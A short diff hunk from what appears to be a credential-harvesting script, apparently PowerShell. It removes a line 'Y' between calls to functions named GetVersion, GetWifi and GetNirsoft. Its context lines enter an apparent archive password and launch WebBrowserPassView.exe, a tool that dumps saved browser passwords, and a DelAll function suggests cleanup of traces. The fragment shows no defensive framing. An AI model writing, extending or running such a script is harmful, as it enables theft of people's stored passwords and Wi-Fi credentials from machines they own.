@@ -156,7 +156,6 @@ function DelAll {
 GetVersion
 GetWifi
 GetNirsoft
-Y
 wbpv28821@
 .\WebBrowserPassView.exe
 
